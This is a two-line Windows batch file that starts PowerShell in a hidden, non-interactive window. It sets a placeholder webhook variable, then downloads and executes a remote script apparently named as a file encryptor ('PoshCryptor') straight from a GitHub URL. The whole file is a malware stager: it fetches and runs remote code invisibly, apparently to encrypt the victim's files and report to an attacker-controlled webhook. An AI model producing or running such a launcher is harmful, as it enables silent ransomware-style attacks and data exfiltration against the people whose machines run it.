@echo off
powershell.exe -NonI -NoP -W H -C "$dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigew0rm/PoshCryptor/main/Encryption/Encryptor.ps1 | iex"
